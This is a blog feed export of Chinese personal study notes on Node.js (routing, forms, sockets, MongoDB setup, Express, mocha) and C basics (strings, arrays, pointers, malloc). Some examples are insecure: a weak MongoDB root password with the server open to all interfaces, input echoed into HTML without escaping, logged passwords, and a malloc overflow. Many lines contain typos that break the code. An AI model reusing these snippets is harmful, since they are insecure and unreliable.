&lt;/body> &lt;/html> file.js var fs = require('fs') //读html文件 module.exports = { readFile: (file, res) => { fs.readFile(file, 'utf-8', (err, data) => { if(err) throw err; res.writeHead(200, {'Content-Type':'text/html; charset=utf-8'}) res.write(data) res.end() })}, readImg: (file, res) => { fs.readFile(file, 'binary', (err, data) => { if(err) throw err; res.writeHead(200, {'Content-Type':'image/jpeg'}) res.write(data, 'binary') res.end() }) } } route.js var file = require('./file.js') module.exports = { home: (req, res) => { //res.write("欢迎来到首页") // 默认路由 file.readFile('./views/home.html', res) }, login: (req, res) => { res.write("登录界面") // 处理路由 }, registor: (req, res) => { res.write("注册界面") // 处理路由 }, img: (req, res) => { //读取文件，也新建一个模块 file.readImg('./images/1.jpg', res) } } router_03.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) => { if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\//,'') console.log(pathName); try{ //最简单的异常处理 route[pathName](req, res) } catch(err){ route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 } } //res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); 路由传递参数1.get方式 login.html &lt;form action="./login" method="get"> &lt;label for="email"> 邮箱: &lt;input type="text" name="email" value=""/> &lt;/label> &lt;label for="password"> 密码: &lt;input type="password" name="password" value=""/> &lt;/label> &lt;label for="submit"> &lt;input type="submit" value="提交" /> &lt;/label> toute.js var file = require('./file.js') var url = require('url') module.exports = { login: (req, res) => { var urlObject = url.parse(req.url, true).query // 通过url解析html表单数据 console.log(urlObject.email) console.log(urlObject.password) file.readFile('./views/login.html', res, req) } } 2.post方式 route.js var file = require('./file.js') var url = require('url') var queryString = require('queryString') module.exports = { login: (req, res) => { //post方式 var post = '' req.on('data', (chunk) => { post += chunk }) req.on('end', () => { var urlObject = queryString.parse(post) //返回一个url对象 console.log(urlObject.email); console.log(urlObject.password); }) file.readFile('./views/login.html', res, req) } } 输入的内容回显到本页面 file.js postReadFile: (file, res, req, post) =>{ var urlObject = queryString.parse(post) var array = ['email', 'password'] var reg; fs.readFile(file, 'utf-8', (err, data) => { if(err) throw err; res.writeHead(200, {'Content-Type':'text/html; charset=utf-8'}) //处理 for(var i=0; i&lt;array.length; i++){ reg = new RegExp('{' + array[i] + '}', 'gi') data = data.replace(reg, urlObject[array[i]]) } if(urlObject.email &amp;&amp; urlObject.password){ data = data.replace(new RegExp('{infoClass}', 'gi'), '') data = data.replace(new RegExp('{formClass}', 'gi'), 'hide') }else{ data = data.replace(new RegExp('{infoClass}', 'gi'), 'hide') data = data.replace(new RegExp('{formClass}', 'gi'), '') } res.write(data) res.end() }) }, route.js login: (req, res) => { //post方式 var post = ''; req.on('data', (chunk) => { post += chunk }) req.on('end', () => { file.postReadFile('./views/login.html', res, req, post) }) }, login.html &lt;div class="{infoClass}"> Email:{email} &lt;br> 密码:{password} &lt;/div> &lt;form action="./login" method="post" class="formClass"> &lt;label for="email"> 邮箱: &lt;input type="text" name="email" value=""/> &lt;/label> &lt;label for="password"> 密码: &lt;input type="password" name="password" value=""/> &lt;/label> &lt;label for="submit"> &lt;input type="submit" value="提交" /> &lt;/label> asyncnpm install async -D 常用功能: //1.串行无关联(第一个参数是数组，第二个参数是个回调函数) //运行时间是两个运行时间总和 console.time('test') async.series([ (callback) => { //数组的第一个元素 setTimeout(()=>{ callback(null,'one') },200) }, (callback)=>{ //数组的第一个元素 setTimeout(()=>{ callback(null,'two') },5000) } ], (err, results) => { // 第二个参数 console.log(results); console.timeEnd('test') //看一下执行时间 } ) // 2.串行无关联(第二种用法，第一个参数是对象) console.time('test') async.series({ one: (callback) => { setTimeout(() => { callback(null, '1') },2000) }, two: (callback) => { setTimeout(() => { callback(null, '2') ,3000) } }, (err, results) => { console.log(results); console.timeEnd('test') }) // 3.并行无关联（第一个参数是数组） //时间取最长的 async.parallel([ (callback) => { setTimeout( ()=>{ callback(null, 'one') },2000) }, (callback) => { setTimeout( ()=>{ callback(null, 'two') },5000) }, ], (err,results)=>{ console.log(results); console.timeEnd('test') //运行时间5s，取最长的 }) //也可以第一个参数是对象 // 4.串行有关联 async.waterfall([ function (callback){ callback(null,'one','two') }, function (arr1,arr2,callback){ callback(null, arr1,arr2,'three') }, function (arr1,arr2,arr3,callback){ callback(null, [arr1,arr2,arr3,'done']) } ],function(err,results){ console.log(results); }) //这里没加异步，按照串行顺序依次下来的 六. Socket 1). 基于net模块实现socket聊天案例 server.js var net = require('net') var chatServer = net.createServer(), clientMap = new Object() var i = 0; //客户端连接流水号 chatServer.on('connection', function (client){ client.name = ++i clientMap[client.name] = client console.log("客户端 "+ client.name +" 连接成功~"); //对客户端发送消息的监听 client.on('data', function (data){ console.log("客户端传来：" + data); broadcast(data, client) //广播给其他 }) //数据错误的处理 client.on('error', function (err){ console.log("client error: " + err); client.end() }) //客户端关闭事件 client.on('close', function (data){ delete clientMap[client.name] console.log(client.name + "下线了"); broadcast(client.name+"下线了", client) //广播给其他 }) }) chatServer.listen(9000) //监听端口 //消息广播 function broadcast (message, client){ for(var key in clientMap){ clientMap[key].write(client.name + ' say:' + message + "\n") } } client.js var net = require('net') var port = 9000 var host = '127.0.0.1' var client = new net.Socket() client.setEncoding = 'UTF-8' //连接服务器 client.connect(port, host, function () { client.write("您好") }) //监听服务端消息 client.on('data', function (data) { console.log("服务端传来：" + data); say() }) client.on('error', function (err){ console.log(err); }) client.on('close', function (err){ console.log('connection closed'); }) const readline = require('readline') const r1 = readline.createInterface({ input: process.stdin, //标准输入 output: process.stdout }) function say() { r1.question('请输入：', (inputStr => { if (inputStr != 'bye'){ client.write(inputStr + '\n') }else{ client.distory() //关闭连接 r1.close() } })) } 2). 浏览器原生支持的WebSocketnpm install ws 案例同上 server.js var wbsocketServer = require('ws').Server, wss = new wbsocketServer({port:9001}) var clientMap = new Object() var i=0 wss.on('connection', function (ws){ ws.name = ++i clientMap[ws.name] = ws console.log(ws.name + " 上线了"); ws.on('message', function (message){ broadcast(message, ws) }) ws.on('close', function (message){ // global.gc() //调用内存回收 console.log(ws + " 离开"); }) }) //广播方法 function broadcast(msg, ws){ for(var key in clientMap){ clientMap[key].send(ws.name + '说：' + msg) } } client.js var WebSocket = require('ws') var ws = new WebSocket('ws://127.0.0.1:9001/') ws.onopen = function () { ws.send('大家好') } ws.onmessage = function (event) { var chatroom = document.getElementById('chatroom') chatroom.innerHtml += '&lt;/br>' + event.data } ws.onclose = function () { alert('Closed') } ws.onerror = function (err) { alert('Error:' + err) } chat.html &lt;body> &lt;div id="chatroom">&lt;/div> &lt;input type="text" name="sayinput" id="sayinput" value=""> &lt;input type="button" name="send" id="sendbutton" value="发送"> &lt;script src="client.js">&lt;/script> &lt;script type="text/javascript"> function send(){ ws.send(sayinput.value) sayinput.vaule = "" } document.onkeyup = function(event){ if (event.keycode == 13){ send() } } sendbutton.onclick = function (){ send() } &lt;/script> &lt;/body> 3). socket.io实现socket当浏览器不支持html5时，就不能用websocket了 借助express实现: npm i express socket.io socket_io.js var app = require('express')() var http = require('http').Server(app) vat io = require('socket.io')(http) var fs = require('fs') app.get('/', (req,res)=>{ function callback(data) { res.send(data.toString()) } fs.readFile('socketIOClient.html', function (err, data){ if(err){ console.log(err); console.log("文件不存在"); }else{ callback(data) } }) }) // app.get('/socket.io.js') //socket.io的设置 //在线用户 var onlineUsers = {} //在线人数 var onlineCount = 0 var 1 = 0 io.on('connection', function (socket){ console.log("有人上线了"); //监听新用户加入 socket.name = i onlineUsers[socket.name] = socket //监听用户退出 socket.on('disconnect', function (){ console.log("有人退出了"); delete onlineUsers[socket.name] }) //监听用户发布的聊天内容 socket.on('message', function (msg){ broadcast(msg, socket) }) }) //广播方法 function broadcast(msg, socket){ for(var key in onlineUsers){ onlineUsers[key].send(socket.name + '说：' + msg) } } http.listen(9002, function (){ console.log(""); }) html &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset="utf-8"> &lt;title>&lt;/title> &lt;style> #chatroom{ width:400px; height:600px; overflow:auto; border:1px solid bule } &lt;/style> &lt;script src="./socket.io.js">&lt;/script> &lt;/head> &lt;body> &lt;script type="text/javascript"> var iosocket = null; windows.onload = function (){ iosocket = io.connect('http://127.0.0.1/9002') iosocket.on('connect'. function (){ iosocket.send('hello, from inclient') }) //接收数据 iosocket.on('message', function (message){ var chatroom = document.getElementById("chatroom"); chatroom.innerHtml += message = '&lt;/br>' }) //断开连接 iosocket.on('disconnect', function (){ console.log("服务端关闭"); }) function send(){ iosocket.send(sayinput.value) sayinput.value = "''" } document.onkeyup = function(event){ if (event.keycode == 13){ send() } } sendbutton.onclick = function (){ send() } } &lt;/script> &lt;div id="chatroom">&lt;/div> &lt;input type="text" name="sayinput" id="sayinput" value=""> &lt;input type="button" name="send" id="sendbutton" value="发送"> &lt;/body> &lt;/html> 七.MongoDB安装(Linux下)1. 通过公钥对资源包一致性和真实性进行验证： sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4 2. 运行下行命令，创建文件/etc/apt/sources.list.d/mongodb-org-4.0.list： echo "deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list 3. 在安装之前，先更新系统资源包： sudo apt-get update 4. 安装mongodb资源包： # 安装MongoDB server sudo apt-get install -y mongodb-org # 安装MongoDB 客户端 sudo apt-get install mongodb-clients 4. 检验是否安装成功： 启动mongod服务： sudo service mongod start #查看mongo版本: mongo --version 5.登录MongoDB并设置密码 # 登录 mongo # 切换到admin数据库 use admin # 创建admin账号，密码::admin111 权限：root权限，授权的数据库名：admin db.createUser({user:"admin", pwd:"admin111", roles:[{role:"root", db:"admin"}]}) 编辑MongoDB配置文件 vim /etc/mongod.conf net: port: 27017 # 端口 bindIp: 0.0.0.0 # 允许访问的地址，0.0.0.0表示所有 security: authorization: enabled 重启MongoDB服务 systemctl restart mongod.service 测试登录 mongo -u admin -p admin111 --authenticationDatabase admin 学习 与mysql语法对比：https://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg 术语、概念 MongoDB集合 一个数据库可以有多个集合(对应mysql的table) MongoDB文档 键值对 如：{'name':'xps', 'like':['code','play']} MongoDB数据类型 常用命令1.数据库操作查看帮助 help db.help() db.test.help() df.test.find().help() 创建/切换数据库 use music # 如果不存在就创建，存在且切换 查询数据库 show dbs # 当数据库为空时，是不显示的 # 我们向一个集合里面插入一个文档 db.user.insertOne({'name':'xps','like':['code','play']}) # 查看集合里面的文档(行) db.user.find() 查看当前使用的数据库 db # db.getName() 显示当前DB状态 db.stats() 查看当前DB版本 db.version() 查看当前DB的链接机器地址 db.getMongo() 删除数据库 db.dropDatabase() 2.集合（Collection）操作….写了半天，忘了保存，算了，放图片吧…. 3.文档操作对集合内数据增删改查 删除 db.user.remove({'name':'xps'}) db.user.delete({'name':'xps'}) db.user.deleteMany({'name':'xps'}) 八. Express框架 一个node.js的web框架 1). 准备安装 npm install express --save, Windows下还有:npm install -g express-generator express -h 测试安装成功 新建项目：express test_express 目录结构： package.js是需要的依赖，切换到项目根目录手动安装npm install app.js是入口 www/bin下面是端口等配置 启动项目： npm start 2). Express初始化项目详解一些模块 "dependencies": { //"body-parser": "~1.15.2", // 解析前端提交的数据 "cookie-parser": "~1.4.4", //解析cookie "debug": "~2.6.9", // 用来显示调试信息 //"ejs": "~2.5.2", //模板，渲染页面 "express": "~4.16.1", "http-errors": "~1.6.3", "jade": "~1.11.0", //模板，渲染页面 "morgan": "~1.9.1" //日志，控制后格式化显示信息 } bin/www入口文件 实现了创建服务和中间件、路由配置 normalizePort() 方法，对端口进行简单处理 1.路由中间件 2.自定义中间件（app.set('port', port)这样） app.use() app.js app.use(express.static(path.join(__dirname, 'public'))); //设置静态文件路径 ... var usersRouter = require('./routes/users'); app.use('/users', usersRouter); router/xxx.js 路由的中间件 //这里的index就是view下面的index.jade res.render('index', { title: 'Express' }); //渲染模板 ， index不用写后缀名 #比如 index.js var express = require('express'); var router = express.Router(); // get('/', xxx) 因为前面写了/user，所以这里只写/即可 router.get('/', function(req, res, next) { res.send('respond with a resource'); }); module.exports = router; // 暴露出去，才能以中间件的形式存在 views/xxx.jade 模板文件 3). Express中的路由users.js var express = require('express'); var router = express.Router(); /* GET users listing. */ router.get('/', function(req, res, next) { res.send('respond with a resource'); }); // 第二层路由，第一层在app.js里 router.get('/list', function(req, res) { res.send('user list'); }); // 可以写成表达式（正则） router.get('/a*d', function(req, res) { res.send('表达式路由'); }); //转到一个文件 router.get('/form', function(req, res) { res.sendFile(__dirname + '/form.html') }); //post请求 router.post('/save', function(req, res) { res.send("表单提交!") }); // all， post和get都接收 router.all('/all',function(req, res) { res.send("post和get都接收!") }); module.exports = router; form.html &lt;form action="/users/save" method="post" class="formClass"> &lt;label for="username"> username: &lt;input type="text" name="username" value=""/> &lt;/label> &lt;label for="submit"> &lt;input type="submit" value="提交" /> &lt;/label> &lt;/form> 4). Express中的模板ejs/jade等 ejs比较简单 #安装（express内置了ejs） npm install ejs --save #配置ejs模板引擎 app.set('view engine','ejs') #渲染页面 render(filename,json)接收两个参数。 #如下 app.get('/learnejs',function(req,res){ let arr=['吃饭','睡觉','打豆豆'] res.render('index',{ list_a:arr }) }) #index.ejs &lt;ul> &lt;%for(var i=0;i&lt;list_a.length;i++){%> &lt;li>&lt;%=list[i]%>&lt;!--%=list[i]%-->&lt;/li> &lt;%}%> &lt; ul> &lt; code>&lt;!--%}%>--> 渲染页面 # render(filename,json)接收两个参数。 常用标签 &lt;% %> 流程控制标签 &lt;%= %> 输出标签（原文输出html标签） &lt;%- %> 输出标签（html会被浏览器解析） &lt;%# %> 注释标签 % 对标记进行转义 includes,在一个模板里面引用另一个模板 &lt;%- include("模板路径", {user:"传递的参数内容"}) %> 九.mocha 前端测试框架 浏览器和Node环境都可使用 安装： # 安装 npm install mocha -g #命令 mocha #本地安装 npm install mocha -D # 修改配置文件中test命令 "test": "......./bin/mocha" # 运行 npm test 基本用法定义测试： 创建一个js文件 describe("Demo", function (){ describe("方法1", function (){ before(function (){ //测试之前做的内容 console.log("---测试之前做的内容") }) after(function (){ //测试之后做的内容 console.log("---测试之前后做的内容") }) beforeEach(function (){ //每条测试之前做的内容 console.log("---每条测试之前做的内容") }) context("情景1", function (){ it("测试1", function (){ }) it("测试2", function (){ }) }) }) }) mocha 来启动测试/ 或使用本地安装的mocha来测试npm test assert断言使用库：chai chai: 断言库 chai: should分割的断言 chai：expect风格的断言 安装到本地：npm install chai -D 使用 const chai = require('chai') const assert = chai.assert describe('Demo', function (){ it("使用 assert风格的断言测试", function (){ var val = 'hello' assert.typeOf(val, 'string') assert.equal('hello') }) }) const chai = require('chai') const sholud = chai.sholud describe('Demo', () => { it("使用 sholud风格的断言测试", function (){ var val = 'hello' val.sholud.exist val.sholud.be.a('string') val.sholud.equal('hello') val.sholud.not.equal('hello') val.sholud.have.length() //多个条件逻辑与 val.sholud.equal('hello').and.exist.and.be.a('string') }) }) const chai = require('chai') const expect = chai.expect describe('Demo', () => { it("使用 expect风格的断言测试", function (){ var val = 'hello' var number = 3 expext(number).to.be.at.most(5) expext(number).to.be.at.least(3) expext(number).to.be.at.within(1,8) expect(value).to.exist expect(value).to.be.a('string') expect(value).to.equal('hello') expect(value).to.not.equal('hello') expect(value).to.have.length(5) }) }) 运行多个测试 mocha --recursive # 递归 好了，再学就跑偏了…… 😄 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言琐碎复习（内容简单,仅自己看）]]></title>
    <url>%2Fposts%2F37285%2F</url>
    <content type="text"><![CDATA[由于好久时间不看C了，好多东西都忘了 本文是跟着郝斌老师的视频做的随堂笔记，课下也没做整理，并不成系统，只是一些简单堆叠，且编码规范都没有，看看就好哈哈 字符串char greeting[6] = {'H', 'e', 'l', 'l', 'o', '\0'}; //1 strcpy(s1, s2); 复制字符串 s2 到字符串 s1。 //2 strcat(s1, s2); 连接字符串 s2 到字符串 s1 的末尾。 //3 strlen(s1); 返回字符串 s1 的长度。 //4 strcmp(s1, s2); 如果 s1 和 s2 是相同的，则返回 0；如果 s1&lt;s2 则返回小于 0；如果 s1>s2 则返回大于 0。 //5 strchr(s1, ch); 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。 //6 strstr(s1, s2); 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。 //strlen 与 sizeof的区别： strlen 是函数 sizeof 是运算操作符 二者得到的结果类型为 size_t，即 unsigned int 类型。 sizeof 计算的是变量的大小，不受字符 \0 影响； strlen 计算的是字符串的长度，以 \0 作为长度判定依据。 // 'a' 表示是一个字符，"a" 表示一个字符串相当于 'a'+'\0'; //字符串遍历 char hi[] = "hello"; for(i==0, i&lt;6,i++) { printf("%c",hi[i]); } 运算符优先级nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnhjjjjjjjjjjjjjjj 优先级 运算符 名称或含义 使用形式 结合方向 说明 1 [] 数组下标 数组名[常量表达式] 左到右 () 圆括号 （表达式）/函数名(形参表) . 成员选择（对象） 对象.成员名 -&gt; 成员选择（指针） 对象指针-&gt;成员名 2 - 负号运算符 -表达式 右到左 单目运算符 (类型) 强制类型转换 (数据类型)表达式 ++ 自增运算符 ++变量名/变量名++ 单目运算符 – 自减运算符 –变量名/变量名– 单目运算符 * 取值运算符 *指针变量 单目运算符 &amp; 取地址运算符 &amp;变量名 单目运算符 ! 逻辑非运算符 !表达式 单目运算符 ~ 按位取反运算符 ~表达式 单目运算符 sizeof 长度运算符 sizeof(表达式) 3 / 除 表达式/表达式 左到右 双目运算符 * 乘 表达式*表达式 双目运算符 % 余数（取模） 整型表达式/整型表达式 双目运算符 4 + 加 表达式+表达式 左到右 双目运算符 - 减 表达式-表达式 双目运算符 5 &lt;&lt; 左移 变量&lt;&lt;表达式 左到右 双目运算符 &gt;&gt; 右移 变量&gt;&gt;表达式 双目运算符 6 &gt; 大于 表达式&gt;表达式 左到右 双目运算符 &gt;= 大于等于 表达式&gt;=表达式 双目运算符 &lt; 小于 表达式&lt;表达式 双目运算符 &lt;= 小于等于 表达式&lt;=表达式 双目运算符 7 == 等于 表达式==表达式 左到右 双目运算符 != 不等于 表达式!= 表达式 双目运算符 8 &amp; 按位与 表达式&amp;表达式 左到右 双目运算符 9 ^ 按位异或 表达式^表达式 左到右 双目运算符 10 \ 按位或 表达式\ 表达式 左到右 双目运算符 11 &amp;&amp; 逻辑与 表达式&amp;&amp;表达式 左到右 双目运算符 12 \ \ 逻辑或 表达式\ \ 表达式 左到右 双目运算符 13 ?: 条件运算符 表达式1? 表达式2: 表达式3 右到左 三目运算符 14 = 赋值运算符 变量=表达式 右到左 /= 除后赋值 变量/=表达式 *= 乘后赋值 变量*=表达式 %= 取模后赋值 变量%=表达式 += 加后赋值 变量+=表达式 -= 减后赋值 变量-=表达式 &lt;&lt;= 左移后赋值 变量&lt;&lt;=表达式 &gt;&gt;= 右移后赋值 变量&gt;&gt;=表达式 &amp;= 按位与后赋值 变量&amp;=表达式 ^= 按位异或后赋值 变量^=表达式 \ = 按位或后赋值 变量\ =表达式 15 , 逗号运算符 表达式,表达式,… 左到右 从左向右顺序运算 注：同一优先级的运算符，运算次序由结合方向所决定。 数组main.c #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> // 2.二维数组 /** int a[3][4]; 总共12个元素，可以当做3行4列看待，依次是: a[0][0],a[0][1],a[0][2],a[0][3] a[1][0],a[1][1],a[1][2],a[1][3] a[2][0],a[2][1],a[2][2],a[2][3] a[i][j] ==> i+1行，j+1列的元素 int a[m][n]; 该二位数组的右下角位置的元素只能是a[m-1][n-1] */ void init_double() { //1.最笨的初始化 int a[3][4]={1,2,3,4,5,6,7,8,9,10,11,12}; //2.分开写（格式要写正确） int b[3][4]={ {1,2,3,4}, {5,6,7,8}, {9,10,11,12} }; //3.其他各种初始化 // 输出二维数组内容 int i, j; for(i=0;i&lt;3;++i) { for(j=0; j&lt;4; ++j) { printf("%-5d \t", b[i][j]); // 付好：左对齐，5代表占5个位置（这不是重点，格式控制有其他控制办法） } printf("\n"); // 格式化(每四个一行) } // 二维数组排序 //求每一行最大值 // } // 多维数组： /* 1. 不存在! 因为内存是线性一维的 2. n维数组可以当做 每个元素是n-1维数组的一维数组 的数组 比如：a[3][4]，可以当做含有三个元素的一维数组，只不过每个元素都可以划分为4个小元素 */ 函数func.h #include &lt;stdio.h> int after_func(); // 函数的声明， 可以不写变量名 void get_max(int, int); // 函数声明，记得加分号 main.c #include "func.h" void before_func() { printf("我是函数测试，在主函数之前定义的。"); getchar(); } void main() { // 函数定义写在主函数之前的时候，那么就无需在主函数里面声明这个函数，只需要把函数体写在主函数前即可 //否则，需要先声明. // 此函数定义在主函数之前，直接调用即可，无须声明 //before_func(); //在主函数之后定义的，需要先声明才能调用。 //1.声明(要放在main外面，我放在了自定义的头文件里面) //2.调用 //after_func(); // 求最大值 //int i,j; //i=5;j=10; //get_max(i, j); int i; for(i=0;i&lt;20;++i) { get_max(i,i+1); } getchar(); } int after_func() { printf("我是函数测试，在主函数之后定义的，需要先声明才能调用。"); getchar(); return 0; } //求最大值 void get_max(int a, int b) { int max_val = a>b?a:b; printf("%d和%d比较，最大值为: %d \n", a,b,max_val); } /* return和break的区别： 1.break:循环、switch 2.return终止函数 */ /* 函数的分类： 1.有参函数和无参函数 2.有返回值和无返回值 3.库函数和用户自定义函数 4.普通函数和主函数(main)：一个程序只能有一个主函数，主函数既是程序的入口，也是程序的出口 主函数能调用主函数，其他函数不能调用main函数，普通函数可以相互调用 5.值传递和引用传递(其实这样说是不对的) */ /* 如何在软件开发中，合理的设计函数来解决实际问题： 功能划分的详细一些，提高利用率 函数是C语言的基本单位，类是Java，C#等的基本单位 */ /* 常用的系统函数: 1. doulbe sqrt(double x) 求x的平方根 2. int abs(int x) 求整数的绝对值 3. double fabs(double x) 推荐书籍： 机械工业出版社：《turboc2.0使用大全》 */ /* 递归： 栈：先进先出 */ /* 变量的作用于和存储方式： 1.按作用域分：全局变量，局部变量（函数内部定义的变量/函数的形参） 2.按变量的存储方式：静态变量，自动变量，寄存器变量 */ int k=99; void test_var() { //局部变量与全局变量命名相同：局部变量会屏蔽掉全局变量 } 指针test.h #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #define N 5 void test1(); void test2(); void test3(); void test4(); void test5(); void test6(); void test7(); void test8(); void base_pointer(); void free_test(); void exchange_two(); void test_exchange1(int,int); void test_exchange2(int,int); void test_exchange3(int,int); void two_pointer(); void dynami_memo1(); void dynami_memo2(); void dynami_memo3(); void dynami_memo4(); void dynami_memo5(); void dynami_memo6(); main.c #include "test.h" void main() { //base_pointer(); exchange_two(); } void test1() { int j=3; int * q; // q是变量名, int *表示q变量存放的是int类型变量的地址（int * 是数据类型） // 错误写法：q=55; 后面不能是值，只能跟地址 q=&amp;j; //*q与j是等同的 /* 1.q保存了j的地址，引起：q指向j。 2.q不是j，j不是q。修改q的值不会影响j,修改j的值也不会影响q的值 3.如果一个指针变量指向一个普通变量，则*指针变量完全等同于普通变量 */ /* 指针：就是地址，地址就是指针 指针变量：存放地址的变量 两者不是一个概念 但是，通常在叙述中，会把指针变量简称为指针 */ // 一级指针 // 指针的本质： 存地址(内存单元的编号)，间接访问 // 指针使用场景： // &amp; 取地址操作符/【引用】 // * 取值操作符/【解引用】 } void test2() { /* 指针的重要性; 表示一些复杂的数据结构; 快速的传递数据 使函数返回一个以上的值 能直接访问硬件 能方便的处理字符串 是理解面向对象语言中引用的基础 */ //地址： /* 内存单元的编号 从零开始的非负整数 范围： */ //指针： /* 指针就是地址，地址就是指针 指针变量就是存放内存单元的变量， 两者不是一个概念 但是，通常在叙述中，会把指针变量简称为指针 指针的本质就是一个操作受限的非负整数 */ //指针的分类： /* 1.基本类型的指针 int *p; int i=10; int j; p = &amp;i; i=*p; printf("%d",j); 例子，见函数base_pointer */ } void base_pointer() { int *p; int *q; int i=5; //*p = i; //【错误】，*p代表的是p指向的地址的变量的值，p现在指向的垃圾值(还没有初始化) //应该这样 p = &amp;i; //*q=p; //【错误】，有语法错误，*q是整形，p是int*类型 //*q = *p; //【错误】,语法没错，但是q指向垃圾值（没初始化） //应该这样： //p=q; // 【错误】，q赋给p，p也变成垃圾值 //printf("%d\n", *p); // q的空间是属于本程序的，所以本程序可以读写q的内容，但是如果q的内部是垃圾值，则本程序不能读写*p的内容,因为*q所代表的的内存单元的控制权限并没有分配给本程序 // // 指针变量的运算： // 指针变量不能相加、相乘、相除（能相减：如果两个指针变量指向的是【同一块连续空间中的不同存储单元】） /* p = &amp;a[1]; q = &amp;a[3]; printf("%d", q-p); */ getchar(); } //指针的偏移 void test3() { int a[N]={1,2,3,4,5}; int *p; int i; p = &amp;a[4]; // 指向a最后一个元素 for(i=0; i&lt;N; i++) // 指针偏移 { printf("%3d", *(p-i)); // p +sizeof(int) } printf("\n"); getchar(); } //指针与自增 void test4() { int a[3]={2,7,8}; int *p; int j; p = a; j = *p++; // j = *p; p=p+1。 printf("a[0]=%d, j=%d, *p=%d \n", a[0], j, *p); // 2,2,7 j = p[0]++; // j=p[0], p[0] = p[0] +1 printf("a[0]=%d, j=%d, *p=%d \n", a[0], j, *p); // 2,7,8 ？？？ getchar(); } //野指针: free以后的指针未被赋值为NULL (指向了一个未知的空间) void test5() { int *p, *p1, *p2, *p3; p = (int *)malloc(4); *p = 1; free(p); p = NULL; // 赋值null以后，后面用的话会崩溃，能迅速找到问题 p1 = (int *)malloc(4); *p1 = 2; // 没有free p2 = (int *)malloc(4); *p2 = 2; free(p1); p3 = (int *)malloc(4); *p3 = 3; *p1 = 20; // 以为p1free了，这里又赋值 printf("p3 = %d", *p3); // 20了 malloc有缓存机制 } // 经典程序：互换两个数字 void exchange_two() { int a=3; int b=5; //int t; //之前的做法 //t=a; //a=b; //b=t; // 现在要求调用一个函数实现 test_exchange3(&amp;a, &amp;b); printf("a=%d,b=%d",a,b); getchar(); } // 不能完成互换功能 void test_exchange1(int a, int b) { int t; t=a; a=b; b=t; } // 不能完成互换功能，只是把q和p的值换了，a和b并没有互换 void test_exchange2(int *p, int *q) { int *t; // 如果要互换，变量类型必须一致 t = p; p = q; q = t; // 形参的改变，不会改变实参的值 } // 可以完成互换: p是a的地址，*p就是a void test_exchange3(int *p, int *q) { int t; // 如果要互换，变量类型必须一致 t = *p; // *p是int，p是int* *p = *q; *q = t; } // *的含义 void test6() { //1.乘法 //2.定义指针变量 int *p; //定义了一个叫p的变，int *表示p只能存放地址 //3.指针运算符：取地址的逆运算/间接访问 // 放在已经定义好的指针变量的前面，取改指针的值 //*p 表示以p的内容为地址的变量 //写法：下面三种是等价的 //int * p; //int *p; //int* p; } void free_test() { /* 脏数据 申请的空间不释放：内存泄露 堆空间：一旦申请，一直占用，除非free */ int i; char *p; scanf("%d", &amp;i); p = (char *)malloc(i); strcpy(p, "hello"); // p指向堆空间 // p = "hellp"; puts(p); free(p); // 释放 printf("free p ~~~~~~~~~~~"); } void test7() { // 一个指针变量到底占几个字节？ /* 指向不同类型，是不同的，比如int 一般是4个字节, char就是1个。 sizeof()可以查看：sizeof(double) p,q,r所占的字节数是一样的 【总结：】一个指针变量，无论他指向的变量占几个字节，该指针变量只占四个字节。 一个变量的地址使用该变量首字节的地址来表示 */ } //动态内存分配（重点） void test8() { /* 1.传统数组的缺点 a.数组长度必须事先制定，且只能是长整数，不能是变量（int len=5; int a[len]; 这样是错误的） b.传统形式定义的数组，该数组的内存，程序员无法手动释放（一旦定义，该分配空间一直存在，直到数组所在的函数运行结束，数组的空间才会被系统释放） c.数组的长度不能再函数运行过程中动态扩充或缩小(长度一旦定义，其长度就不能再更改) d.A函数定义的数组，在A函数运行期间可以被其他函数使用；但A函数执行完毕后，A函数中的数组将无法再被其他函数使用 传统数组也叫静态数组 2.为什么需要动态分配内存 解决了传统数组的4个缺陷 3.动态内存分配举例_ 动态数组的构造 4.静态内存和动态内存的比较 5.跨函数使用内存的问题 */ } void dynami_memo1() { // malloc 是memory(内存) allocate(分配)的缩写 int i = 5; char *p; p = (char *)malloc(i); /* 1.要使用malloc，必须添加malloc.h或stdlib.h头文件 2.malloc只有一个形参，且形参必须是整数类型 3.上面，表示请求系统为本程序分配5个字节 4.malloc函数只能返回第一个字节的地址，所以前面要把地址强制转换为int* 5.p本身的内存是静态分配的，p所指向的内存是动态分配的 */ strcpy(p, "hello"); // p指向堆空间 // p = h e l l o \o; puts(p); free(p); // 释放p所指向的内存 （p本身的内存是静态的，不能由程序员手动释放） printf("free p ~~~~~~~~~~~"); // 脏数据 // 申请的空间不释放：内存泄露 // 堆空间：一旦申请，一直占用，除非free } void f(int *q) { // *p = 200; // error // q = 20 //error // q是p的一份拷贝(副本) // **q=200 // error *q=200; } void dynami_memo2() { //int *arr = (int*)malloc(20); // int *p; // arr[0] = 1; // arr[1] = 1; // arr[2] = 1; // arr[3] = 1; // p = (int*)realloc(arr, 40); // 扩展 // p[4] = 6; int *p = (int *)malloc(sizeof(int)); *p = 10; printf("%d\n", *p); //10 f(p); printf("%d\n", *p); //200 } //动态内存分配举例 动态一维数组的构造 void dynami_memo3() { int len; int 